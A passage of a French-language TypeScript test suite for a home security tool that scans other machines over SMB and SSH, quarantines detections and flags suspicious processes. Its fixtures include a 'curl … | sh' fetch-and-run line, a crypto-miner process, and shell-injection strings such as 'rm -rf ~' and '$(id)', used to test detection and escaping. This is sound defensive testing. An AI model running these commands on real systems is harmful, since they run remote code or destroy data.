    saveMachine(w.home, { label: 'PC-SALON', host: '127.0.0.1', user: 'root', password: 'ancien-faux', via: 'smb', smbPort: b.smbPort });
    const raison = w.v.modules().find((m) => m.id === 'ullr')!.actions.find((x) => x.id === 'analyser_poste')!.grave!({ poste: 'PC-SALON', quoi: 'tout' });
    assert.match(raison ?? '', /lire les fichiers de PC-SALON .* rien n'est modifié/, 'lire un autre poste demande toujours ton accord');
    const refus = await w.v.act('ullr', 'analyser_poste', { poste: 'PC-SALON' }); assert.equal(refus.ok, false); assert.match(refus.text, /mot de passe refusé/);
    const r = await w.v.act('ullr', 'analyser_poste', { poste: 'PC-SALON', utilisateur: 'root', mot_de_passe: b.pw, quoi: 'tout' });
    assert.equal(r.ok, true, r.text);
    assert.match(r.text, /PC-SALON \(127\.0\.0\.1\) · C:, \/\/127\.0\.0\.1\/Photos : \d+ fichiers analysés .* par le partage de fichiers/);
    assert.match(r.text, /Malware connu : Essai\.Colis-1 — PC-SALON › C:\/Users\/Fatima\/Downloads\/facture-colis\.exe \(à vérifier\) → « isole la détection [a-f0-9]{8} »/);
    assert.match(r.text, /Malware connu : Essai\.Gros-1 — PC-SALON › C:\/Users\/Fatima\/Downloads\/gros-installateur\.exe/, 'un programme de 49 Mo est reconnu par son empreinte complète');
    assert.match(r.text, /EICAR.*fichier de test, laissé en place/i); assert.match(r.text, /Rien n'a été modifié sur le poste\. Aucun antivirus ne détecte tout\./);
    assert.ok(existsSync(join(b.c, 'Users/Fatima/Downloads/facture-colis.exe')), 'rien n\'est touché sur le poste par l\'analyse');
    // Le mot de passe : dans le coffre des machines seulement.
    assert.equal(listMachines(w.home).find((m) => m.label === 'PC-SALON')!.password, b.pw); assert.equal(listMachines(w.home).length, 1);
    const partout = JSON.stringify([r, w.v.alerts({ limit: 100 }), w.v.manips({ limit: 50 }), w.v.ctx('ullr').settings, w.envoyes]) + readFileSync(join(w.v.ctx('ullr').dir, 'rapports', `${(r.data as { rapport: string }).rapport}.json`), 'utf8');
    assert.ok(!partout.includes(b.pw) && !partout.includes('ancien-faux'), 'le mot de passe n\'apparaît dans aucune réponse, alerte, réglage ni rapport');
    // Alerte, rapport, page.
    assert.ok(w.v.alerts({ module: 'ullr' }).some((x) => /Malware connu : Essai\.Colis-1 sur PC-SALON/.test(x.title) && /Rien n'a été touché sur le poste/.test(x.detail ?? '')));
    assert.match((await w.v.act('ullr', 'rapport')).text, /Poste lu par le partage de fichiers \(Windows\), sans rien y installer ni modifier\./);
    const page = async () => w.v.modules().find((m) => m.id === 'ullr')!.view(w.v.ctx('ullr'), new URLSearchParams());
    const table = (v: Awaited<ReturnType<typeof page>>, re: RegExp) => v.sections.find((x) => x.kind === 'table' && re.test(x.title ?? '')) as { rows: Array<{ cells: string[]; actions?: Array<{ action: string; label: string; input: Record<string, unknown> }> }> };
    let v = await page();
    const ligne = table(v, /^Détections/).rows.find((x) => /facture-colis/.test(x.cells[2]))!; assert.equal(ligne.actions![0].action, 'isoler_distant'); assert.equal(ligne.actions![0].label, 'Isoler sur le poste');
    assert.deepEqual(table(v, /^Autres postes/).rows[0].cells.slice(0, 3), ['PC-SALON', '127.0.0.1', 'root']); assert.match(table(v, /^Autres postes/).rows[0].cells[3], /\d+ fichiers · 3 détection\(s\)/);
    assert.ok(v.sections.some((x) => x.kind === 'form' && x.title === 'Analyser un autre poste'));
    // Mise à l'écart sur le poste : avec ton accord, réversible.
    const id = String(ligne.actions![0].input.detection), isoler = w.v.modules().find((m) => m.id === 'ullr')!.actions.find((x) => x.id === 'isoler_distant')!;
    assert.match(isoler.grave!({ detection: id }, w.v.ctx('ullr')) ?? '', /renommer PC-SALON › C:\/Users\/Fatima\/Downloads\/facture-colis\.exe sur son poste/);
    const iso = await w.v.act('ullr', 'isoler_distant', { detection: id }); assert.equal(iso.ok, true, iso.text);
    assert.ok(!existsSync(join(b.c, 'Users/Fatima/Downloads/facture-colis.exe')) && existsSync(join(b.c, 'Users/Fatima/Downloads/facture-colis.exe.odin-quarantaine')), 'le fichier est renommé sur le poste');
    v = await page(); assert.ok(table(v, /^Quarantaine/).rows.some((x) => /facture-colis\.exe \(mis à l'écart sur le poste\)/.test(x.cells[1]))); assert.equal(table(v, /^Détections/).rows.find((x) => /facture-colis/.test(x.cells[2]))!.cells[5], 'isolé sur le poste');
    assert.equal((await w.v.act('ullr', 'isoler_distant', { detection: id })).ok, false, 'deux fois : le fichier n\'est plus là');
    const remis = await w.v.act('ullr', 'restaurer_distant', { id: (iso.data as { id: string }).id }); assert.equal(remis.ok, true, remis.text);
    assert.equal(readFileSync(join(b.c, 'Users/Fatima/Downloads/facture-colis.exe'), 'utf8'), echantillon);
    // Un fichier du système n'est jamais déplacé à distance ; une détection locale ne passe pas par là.
    await connue(w, 'pilote sain', 'Essai.Pilote-1');
    const r2 = await w.v.act('ullr', 'analyser_poste', { poste: 'PC-SALON', ou: 'C:\\Windows' }); assert.match(r2.text, /Essai\.Pilote-1/);
    const idSys = /isole la détection ([a-f0-9]{8})/.exec(r2.text)![1], sys = await w.v.act('ullr', 'isoler_distant', { detection: idSys }); assert.equal(sys.ok, false); assert.match(sys.text, /fichier du système/);
    assert.ok(existsSync(join(b.c, 'Windows/System32/pilote.sys')));
    // Analyse rapide d'un seul endroit, sans le mot de passe (il est au coffre) ; poste inconnu : demande claire.
    const r3 = await w.v.act('ullr', 'analyser_poste', { poste: '127.0.0.1', quoi: 'rapide' }); assert.equal(r3.ok, true, r3.text); assert.match(r3.text, /C:\/Users, C:\/ProgramData/);
    const inconnu = await w.v.act('ullr', 'analyser_poste', { poste: '192.168.77.77' }); assert.equal(inconnu.ok, false); assert.match(inconnu.text, /pas encore de compte pour « 192\.168\.77\.77 »/);
  } finally { w.fin(); b.fin(); }
});

test('Asclépios analyse un poste Linux par SSH ; une longue analyse continue toute seule et prévient à la fin ; on peut l\'arrêter', { skip: !peutSsh ? 'sshd absent' : false, timeout: 180_000 }, async () => {
  const b = await banc(), w = monde(b);
  try {
    const dossier = join(b.dir, 'serveur', 'var', 'www'); mkdirSync(dossier, { recursive: true });
    writeFileSync(join(dossier, 'index.php'), '<?php echo "bonjour"; ?>'); writeFileSync(join(dossier, 'colis.bin'), 'programme d\'essai inoffensif n° 2'); writeFileSync(join(dossier, 'eicar.txt'), EICAR);
    await connue(w, 'programme d\'essai inoffensif n° 2', 'Essai.Linux-2');
    saveMachine(w.home, { label: 'serveur-web', host: '127.0.0.1', user: 'root', port: b.sshPort, via: 'ssh' });
    const r = await w.v.act('ullr', 'analyser_poste', { poste: 'serveur-web', ou: dossier });
    assert.equal(r.ok, true, r.text); assert.match(r.text, /serveur-web \(127\.0\.0\.1\) · .*var\/www : 3 fichiers analysés .* par SSH/);
    assert.match(r.text, new RegExp(`Malware connu : Essai\\.Linux-2 — serveur-web › ${dossier.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}/colis\\.bin \\(à vérifier\\)`));
    const id = /isole la détection ([a-f0-9]{8})/.exec(r.text)![1];
    const iso = await w.v.act('ullr', 'isoler_distant', { detection: id }); assert.equal(iso.ok, true, iso.text);
    assert.ok(!existsSync(join(dossier, 'colis.bin'))); assert.equal(statSync(join(dossier, 'colis.bin.odin-quarantaine')).mode & 0o777, 0, 'mis à l\'écart : renommé et privé de tout droit');
    assert.equal((await w.v.act('ullr', 'restaurer_distant', { id: (iso.data as { id: string }).id })).ok, true);
    assert.equal(readFileSync(join(dossier, 'colis.bin'), 'utf8'), 'programme d\'essai inoffensif n° 2'); assert.equal(statSync(join(dossier, 'colis.bin')).mode & 0o777, 0o644);
    // Longue analyse : la réponse arrive tout de suite, l'analyse continue, la fin est annoncée.
    for (let k = 0; k < 400; k++) writeFileSync(join(dossier, `page-${k}.html`), `<p>page ${k}</p>`);
    w.v.ctx('ullr').saveSettings({ attenteDistante: 0 });
    const long = await w.v.act('ullr', 'analyser_poste', { poste: 'serveur-web', ou: dossier });
    assert.match(long.text, /Analyse de serveur-web lancée .* je te préviens à la fin/); assert.equal((long.data as { enCours: boolean }).enCours, true);
    assert.match((await w.v.act('ullr', 'analyser_poste', { poste: 'serveur-web', ou: dossier })).text, /une analyse est déjà en cours/);
    const annonce = async (re: RegExp) => { for (let k = 0; k < 300; k++) { const m = w.envoyes.find((x) => re.test(x)); if (m) return m; await new Promise((res) => setTimeout(res, 50)); } return ''; };
    assert.match(await annonce(/fichiers analysés/), /serveur-web .* 403 fichiers analysés/, 'la fin de l\'analyse est annoncée avec son résultat');
    // Arrêt : l'analyse en cours se coupe, le rapport partiel est gardé.
    w.envoyes.length = 0; for (let k = 400; k < 3000; k++) writeFileSync(join(dossier, `page-${k}.html`), `<p>page ${k}</p>`);
    await w.v.act('ullr', 'analyser_poste', { poste: 'serveur-web', ou: dossier });
    assert.match((await w.v.act('ullr', 'arreter')).text, /Analyse de serveur-web.* arrêtée/);
    assert.match(await annonce(/fichiers analysés/), /analyse arrêtée/); assert.match((await w.v.act('ullr', 'etat')).text, /Dernière analyse : serveur-web/);
  } finally { w.fin(); b.fin(); }
});

// ---------------- Les autres applis sur un autre poste (mêmes commandes, par SSH) ----------------
test('« Sur quel poste ? » : la machine d\'Odin par défaut, un poste du coffre sinon, refus clairs ; les arguments ne deviennent jamais des commandes', () => {
  const home = mkdtempSync(join(tmpdir(), 'postes-'));
  try {
    const ctx = { home, run: async () => ({ code: 0, out: 'local', err: '' }), has: async () => true } as never;
    for (const ici of ['', '  ', 'ici', 'Cette machine', 'local', 'localhost', 'odin', undefined]) assert.equal(posteDe(ctx, ici).local, true, String(ici));
    assert.ok(estIci('') && estIci('ICI') && !estIci('serveur-web') && !estIci('192.168.1.20'));
    assert.throws(() => posteDe(ctx, 'serveur-web'), /poste « serveur-web » inconnu : ajoute-le dans Réglages/);
    saveMachine(home, { label: 'serveur-web', host: '192.168.1.5', user: 'root', via: 'ssh' }); saveMachine(home, { label: 'PC-SALON', host: '192.168.1.20', user: 'Fatima', password: 'x', via: 'smb' });
    assert.throws(() => posteDe(ctx, 'nas'), /inconnu \(postes enregistrés : serveur-web, PC-SALON\)/);
    assert.throws(() => posteDe(ctx, 'PC-SALON'), /partage de fichiers \(Windows\) : cette appli lit les postes Linux et Mac/);
    const p = posteDe(ctx, '192.168.1.5'); assert.deepEqual({ nom: p.nom, local: p.local }, { nom: 'serveur-web', local: false });
    assert.deepEqual(postesLisibles(ctx).map((x) => x.nom), ['Cette machine', 'serveur-web'], 'les postes Windows ne sont pas proposés aux applis qui lisent par SSH');
  } finally { rmSync(home, { recursive: true, force: true }); }
  assert.equal(ligneDeCommande('df', ['-B1', '-P']), 'df \'-B1\' \'-P\''); assert.equal(ligneDeCommande('tail', ['-c', '100', '--', '/var/log/a b\'; rm -rf ~; \'.log']), 'tail \'-c\' \'100\' \'--\' \'/var/log/a b\'\\\'\'; rm -rf ~; \'\\\'\'.log\'');
  for (const c of ['rm -rf /', 'a;b', '$(id)', 'a|b', '']) assert.throws(() => ligneDeCommande(c, []), /commande invalide/, c);
});

test('disques, pare-feu et journaux d\'un autre poste, lus par un vrai SSH : mêmes résultats que sur place', { skip: !peutSsh ? 'sshd absent' : false, timeout: 120_000 }, async () => {
  const b = await banc(), w = monde(b);
  try {
    saveMachine(w.home, { label: 'serveur-web', host: '127.0.0.1', user: 'root', port: b.sshPort, via: 'ssh' });
    const ctx = w.v.ctx('fensalir'), p = posteDe(ctx, 'serveur-web');
    assert.equal(await p.systeme(), 'linux'); assert.equal(await p.has('sh'), true); assert.equal(await p.has('programme-qui-n-existe-pas'), false);
    const r = await p.run('sh', ['-c', 'echo sortie; echo erreur >&2; exit 3']); assert.deepEqual(r, { code: 3, out: 'sortie\n', err: 'erreur\n' }, 'sortie et erreurs séparées, code rendu');
    assert.equal((await p.run('echo', ['a b', '$(id)', '`id`', ';ls'])).out, 'a b $(id) `id` ;ls\n', 'les arguments arrivent tels quels');
    const f = join(b.dir, 'journal.log'); writeFileSync(f, `${'x'.repeat(500)}\nfin du journal\n`);
    assert.equal(await p.lire(f, 15), 'fin du journal\n'); assert.equal(await p.lire(join(b.dir, 'absent.log')), ''); assert.equal(await p.lire('relatif.log'), '');
    // Pyramide : les volumes du poste (ici la même machine, donc les mêmes que sur place).
    const local = await w.v.act('fensalir', 'disques'), distant = await w.v.act('fensalir', 'disques', { poste: 'serveur-web' });
    assert.equal(distant.ok, true, distant.text); assert.match(distant.text, /^Sur serveur-web :\n/);
    assert.deepEqual((distant.data as { volumes: unknown[] }).volumes, (local.data as { volumes: unknown[] }).volumes); assert.equal((distant.data as { poste: string }).poste, 'serveur-web');
    assert.match((await w.v.act('fensalir', 'partages', { poste: 'serveur-web' })).text, /^Sur serveur-web :\n/);
    const page = await w.v.modules().find((m) => m.id === 'fensalir')!.view(ctx, new URLSearchParams({ poste: 'serveur-web' }));
    assert.match(page.subtitle ?? '', /^serveur-web · /); assert.ok(page.side?.some((x) => x.kind === 'form' && x.title === 'Voir les disques d\'un autre poste' && x.action === 'disques'), 'la page propose de voir un autre poste (le résultat reste affiché sous le formulaire)');
    // Thermopyles : les ports à l'écoute du poste, dont le SSH d'essai.
    const fw = await w.v.act('hlid', 'etat', { poste: 'serveur-web' }); assert.equal(fw.ok, true, fw.text); assert.match(fw.text, /^Sur serveur-web · Pare-feu : /);
    assert.ok((fw.data as { ecoutes: Array<{ port: number }> }).ecoutes.some((e) => e.port === b.sshPort), 'le port du SSH d\'essai est vu à l\'écoute sur le poste');
    assert.match((await w.v.modules().find((m) => m.id === 'hlid')!.view(w.v.ctx('hlid'), new URLSearchParams({ poste: 'serveur-web' }))).subtitle ?? '', /^serveur-web · /);
    // Chroniques : les journaux du poste (les alertes d'Odin ne s'y mêlent pas).
    w.v.ctx('ullr').alert({ level: 'info', title: 'ALERTE-LOCALE-ZZ7', key: 'zz7' });
    assert.match((await w.v.act('mimisbrunnr', 'chercher', { q: 'ALERTE-LOCALE-ZZ7', heures: 1 })).text, /ALERTE-LOCALE-ZZ7/);
    const jr = await w.v.act('mimisbrunnr', 'chercher', { q: 'ALERTE-LOCALE-ZZ7', heures: 1, poste: 'serveur-web' }); assert.equal(jr.ok, true, jr.text); assert.doesNotMatch(jr.text, /ALERTE-LOCALE-ZZ7/);
    assert.equal((await w.v.act('mimisbrunnr', 'repetes', { poste: 'serveur-web' })).ok, true);
    // Sans IA : « … sur serveur-web » est compris tout seul (le poste est un nom connu de la page).
    const dit = await w.v.order('état des disques sur serveur-web');
    const compris = dit.understood as { kind: string; module?: string; action?: string; input?: Record<string, unknown> } | undefined;
    assert.deepEqual([compris?.kind, `${compris?.module}.${compris?.action}`, compris?.input], ['action', 'fensalir.disques', { poste: 'serveur-web' }]);
    assert.match(dit.text, /Sur serveur-web :\n/);
    // Refus clairs : poste inconnu, poste éteint.
    const inconnu = await w.v.act('fensalir', 'disques', { poste: 'nas-du-garage' }); assert.equal(inconnu.ok, false); assert.match(inconnu.text, /poste « nas-du-garage » inconnu/);
    saveMachine(w.home, { label: 'eteint', host: '127.0.0.1', user: 'root', port: await libre(), via: 'ssh' });
    const eteint = await w.v.act('hlid', 'etat', { poste: 'eteint' }); assert.equal(eteint.ok, false); assert.match(eteint.text, /SSH est fermé sur eteint/);
  } finally { w.fin(); b.fin(); }
});

test('Hygie : l\'état d\'un autre poste (Linux et Mac), lu d\'une seule demande', () => {
  const linux = lireSonde('serveur-web', `---SYS\nLinux\nsrv-web-01\n6.8.0-45-generic\n---STAT\ncpu  1000 0 500 8000 100 0 0 0 0 0\ncpu  1100 0 550 8300 150 0 0 0 0 0\n---MEM\nMemTotal:        8000000 kB\nMemFree:          500000 kB\nMemAvailable:    2000000 kB\nBuffers:          100000 kB\nCached:          1500000 kB\nSwapTotal:       2000000 kB\nSwapFree:        1500000 kB\n---CHARGE\n0.52 0.40 0.31 1/312 4242\n---DUREE\n1036800.55 4000000.00\n---COEURS\n4\n---DISQUES\nFilesystem     1024-blocks      Used Available Capacity Mounted on\n/dev/sda1        100000000  61000000  39000000      61% /\ntmpfs              4000000         0   4000000       0% /dev/shm\n/dev/loop3           66846     66846         0     100% /snap/core22/1612\n/dev/sdb1       1000000000 950000000  50000000      95% /srv/data\n/dev/sda1        100000000  61000000  39000000      61% /home\n`);
  assert.deepEqual({ systeme: linux.systeme, hote: linux.hote, noyau: linux.noyau, coeurs: linux.coeurs, allumeDepuis: linux.allumeDepuis, cpu: linux.cpu, attente: linux.attente, charge: linux.charge }, { systeme: 'Linux', hote: 'srv-web-01', noyau: '6.8.0-45-generic', coeurs: 4, allumeDepuis: 1036801, cpu: 30, attente: 10, charge: [0.52, 0.4, 0.31] });
  assert.deepEqual(linux.mem, { total: 8000000 * 1024, utilisee: 6000000 * 1024, echange: 500000 * 1024 });
  assert.deepEqual(linux.disques.map((d) => [d.mount, d.pct]), [['/', 61], ['/srv/data', 95]], 'volumes virtuels, snap et doublons retirés');
  const mac = lireSonde('mac-de-fatima', `---SYS\nDarwin\nMac-de-Fatima.local\n24.1.0\n---STAT\n---MEM\n---CHARGE\n18:02  up 3 days,  4:11, 2 users, load averages: 1,52 1,80 2,01\n---DUREE\n---COEURS\n8\n---DISQUES\nFilesystem     1024-blocks      Used Available Capacity  Mounted on\n/dev/disk3s1s1   482797652  10876580 201430956     6%    /\ndevfs                  205       205         0   100%    /dev\n/dev/disk3s6     482797652   2097172 201430956     2%    /System/Volumes/VM\n/dev/disk3s5     482797652 266936788 201430956    57%    /System/Volumes/Data\nmap auto_home            0         0         0   100%    /System/Volumes/Data/home\n`);
  assert.deepEqual({ systeme: mac.systeme, coeurs: mac.coeurs, cpu: mac.cpu, mem: mac.mem, charge: mac.charge }, { systeme: 'macOS', coeurs: 8, cpu: undefined, mem: undefined, charge: [1.52, 1.8, 2.01] });
  assert.deepEqual(mac.disques.map((d) => [d.mount, d.pct]), [['/', 5], ['/System/Volumes/Data', 57]]);
  assert.deepEqual(lireSonde('x', '').disques, []);
});

test('Hygie par un vrai SSH : état et processus d\'un autre poste', { skip: !peutSsh ? 'sshd absent' : false, timeout: 120_000 }, async () => {
  const b = await banc(), w = monde(b);
  try {
    saveMachine(w.home, { label: 'serveur-web', host: '127.0.0.1', user: 'root', port: b.sshPort, via: 'ssh' });
    const r = await w.v.act('eir', 'etat', { poste: 'serveur-web' }); assert.equal(r.ok, true, r.text);
    assert.match(r.text, /^serveur-web \(.+\) · Linux .+\nProcesseur [\d.]+ % \((bon|à suivre|attention|grave)\) · \d+ cœurs · charge [\d.]+ \/ [\d.]+ \/ [\d.]+/); assert.match(r.text, /\nMémoire .+ \/ .+ \(\d+ %, /); assert.match(r.text, /\nDisque \/ : \d+ % /);
    const e = r.data as { coeurs: number; mem: { total: number } }; assert.ok(e.coeurs >= 1 && e.mem.total > 100 * 1024 * 1024);
    const ps = await w.v.act('eir', 'processus', { poste: 'serveur-web', n: 5 }); assert.equal(ps.ok, true, ps.text); assert.match(ps.text, /^Sur serveur-web :\n\d+ · /); assert.equal((ps.data as unknown[]).length, 5);
    assert.match((await w.v.act('eir', 'etat')).text, /Processeur/, 'sans poste : la machine d\'Odin, comme avant');
    assert.equal((await w.v.act('eir', 'etat', { poste: 'inconnu' })).ok, false);
  } finally { w.fin(); b.fin(); }
});

test('Némésis : les programmes d\'un autre poste (Linux avec leur vrai chemin, Mac sans), lus d\'une seule demande', () => {
  const linux = lireSondeProcs(['    1 /sbin/init splash', '  812 nginx: master process /usr/sbin/nginx -g daemon on;', '  901 sh -c curl http://203.0.113.9/x | sh', ' 4242 ./kdevtmpfsi --donate-level 1', ' 5000 /usr/bin/python3 /opt/mon appli/serveur.py',
    '---PROG', '    1     0     0 systemd', '  812     1     0 nginx', '  901   812    33 sh', ' 4242     1  1000 kdevtmpfsi', ' 5000     1  1000 python3',
    '---EXE', '1\t/usr/lib/systemd/systemd', '812\t/usr/sbin/nginx', '901\t/usr/bin/dash', '4242\t/tmp/.x/kdevtmpfsi (deleted)', '5000\t/usr/bin/python3.12', 'pas un numéro\t/x', ''].join('\n'));
  assert.equal(linux.length, 5); assert.deepEqual(linux.find((p) => p.pid === 4242), { pid: 4242, ppid: 1, uid: 1000, name: 'kdevtmpfsi', exe: '/tmp/.x/kdevtmpfsi (deleted)', cmd: './kdevtmpfsi --donate-level 1' });
  assert.equal(linux.find((p) => p.pid === 5000)!.cmd, '/usr/bin/python3 /opt/mon appli/serveur.py', 'un chemin avec des espaces reste entier');
  assert.deepEqual(judge(linux).map((x) => `${x.pid} ${x.rule}`).sort(), ['4242 mineur de cryptomonnaie', '4242 programme effacé après son lancement', '4242 programme lancé depuis un dossier temporaire', '901 shell ouvert par le serveur web']);
  // Un Mac n'a pas /proc : « ps » donne déjà le chemin complet du programme.
  const mac = lireSondeProcs(['  1 /sbin/launchd', ' 77 /private/tmp/outil --cache', '---PROG', '  1   0   0 /sbin/launchd', ' 77   1 501 /private/tmp/outil', '---EXE', ''].join('\n'));
  assert.deepEqual(mac.map((p) => [p.pid, p.name, p.exe]), [[1, 'launchd', '/sbin/launchd'], [77, 'outil', '/private/tmp/outil']]);
  assert.deepEqual(lireSondeProcs(''), []); assert.deepEqual(lireSondeProcs('n\'importe quoi\n'), []);
});

test('Némésis par un vrai SSH : un programme lancé depuis un dossier temporaire est trouvé sur l\'autre poste, puis arrêté avec ton accord', { skip: !peutSsh ? 'sshd absent' : false, timeout: 120_000 }, async () => {
  const b = await banc(), w = monde(b), dir = mkdtempSync('/tmp/odin-essai-');
  let enfant: ChildProcess | undefined;
  try {
    saveMachine(w.home, { label: 'serveur-web', host: '127.0.0.1', user: 'root', port: b.sshPort, via: 'ssh' });
    // Inoffensif : une copie de « sleep », lancée depuis /tmp comme le ferait un programme déposé par un intrus.
    copyFileSync('/bin/sleep', join(dir, 'dormeur')); chmodSync(join(dir, 'dormeur'), 0o755);
    enfant = spawn(join(dir, 'dormeur'), ['300'], { stdio: 'ignore' }); await new Promise((r) => setTimeout(r, 300));
    const r = await w.v.act('skogul', 'analyser', { poste: 'serveur-web' }); assert.equal(r.ok, true, r.text);
    assert.match(r.text, /^serveur-web · \d+ programme\(s\) en cours\n/); assert.match(r.text, new RegExp(`\\[haute\\] programme lancé depuis un dossier temporaire — dormeur \\(pid ${enfant.pid}\\)`), r.text);
    assert.doesNotMatch(r.text, /---PROG/, 'la demande d\'Odin elle-même n\'est pas signalée');
    const d = r.data as { programmes: number; complet: boolean; decouvertes: Array<{ pid: number }> }; assert.ok(d.programmes > 3 && d.complet && d.decouvertes.some((x) => x.pid === enfant!.pid));
    // Arrêter là-bas : action grave (ton accord), puis le programme n'existe plus.
    const tuer = w.v.module('skogul')!.actions.find((x) => x.id === 'tuer')!;
    assert.equal(tuer.grave!({ pid: enfant.pid, poste: 'serveur-web' }), `arrêter le processus ${enfant.pid} sur serveur-web`); assert.equal(tuer.grave!({ pid: 4242 }), 'arrêter le processus 4242');
    const fini = new Promise<void>((ok) => enfant!.once('exit', () => ok()));
    const k = await w.v.act('skogul', 'tuer', { pid: enfant.pid, poste: 'serveur-web' }); assert.match(k.text, new RegExp(`Processus ${enfant.pid} arrêté sur serveur-web`), k.text);
    await fini; assert.equal(enfant.signalCode, 'SIGKILL');
    assert.doesNotMatch((await w.v.act('skogul', 'analyser', { poste: 'serveur-web' })).text, /dormeur/);
    assert.equal((await w.v.act('skogul', 'analyser', { poste: 'inconnu' })).ok, false);
    assert.match((await w.v.act('skogul', 'analyser')).text, /Aucun comportement suspect|\[(critique|haute|moyenne)\]/, 'sans poste : la machine d\'Odin, comme avant');
    assert.match((await w.v.order('processus suspects sur serveur-web')).text, /^Némésis · Analyser maintenant\nserveur-web · \d+ programme/, 'sans IA aussi');
    const vue = await w.v.module('skogul')!.view(w.v.ctx('skogul'), new URLSearchParams());
    assert.ok(vue.side?.some((x) => x.kind === 'form' && x.title === 'Analyser un autre poste' && x.params[0].options?.includes('serveur-web')));
  } finally { try { enfant?.kill('SIGKILL'); } catch { /* déjà arrêté */ } rmSync(dir, { recursive: true, force: true }); w.fin(); b.fin(); }
});
